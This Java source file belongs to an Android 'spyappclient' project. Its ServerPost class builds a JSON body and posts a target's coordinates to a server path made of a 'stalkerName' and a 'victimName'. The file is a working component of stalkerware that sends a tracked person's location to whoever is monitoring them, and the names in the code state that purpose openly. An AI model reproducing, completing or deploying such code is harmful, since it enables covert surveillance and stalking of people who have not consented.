package com.example.alber.spyappclient;

import android.content.Context;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.JsonRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.locks.ReentrantLock;

public class ServerPost {

    private URL url;
    private String stringUrl;
    private HttpURLConnection urlConnection;
    private BufferedReader in;
    private BufferedWriter out;
    private StringBuilder responseStrBuilder;
    private String stalkerName;
    private String victimName;

    public String getReturnedValue() {
        return returnedValue;
    }

    private String returnedValue="";
    private ReentrantLock lock=new ReentrantLock();
    private Context context;

    public Map<String, String> getParams() {
        return params;
    }

    private Map<String, String> params;

    ServerPost(String url,Context c,String stalkerName,String victimName) {
        try {

            this.url=new URL(url);
            context=c;
            stringUrl=url;
            params = new HashMap<String, String>();
            this.stalkerName=stalkerName;
            this.victimName=victimName;

        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

    }

    public void addToPost(String key,String value) {
        lock.lock();
        try{
            params.put(key,value);
        }
        finally {
            lock.unlock();
        }
    }


    public void postCords()
    {
        new Thread(new Runnable() {
            @Override
            public void run() {
                lock.lock();
                JSONObject jsonObj = new JSONObject(params);
                stringUrl+=(stalkerName+"/"+victimName);

                JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
                        (Request.Method.POST, stringUrl, jsonObj, new Response.Listener<JSONObject>() {

                            @Override
                            public void onResponse(JSONObject response) {
                                Log.d("response","response");
                                returnedValue=response.toString();
                            }
                        }, new Response.ErrorListener() {

                            @Override
                            public void onErrorResponse(VolleyError error) {
                                // TODO: Handle error
                                Log.d("error",error.getMessage());
                            }
                        });

                lock.unlock();

                //used Singleton to increase performance
                SingletonPostRequest.getInstance(context).addToRequestQueue(jsonObjectRequest);
            }

        }).run();
    }
}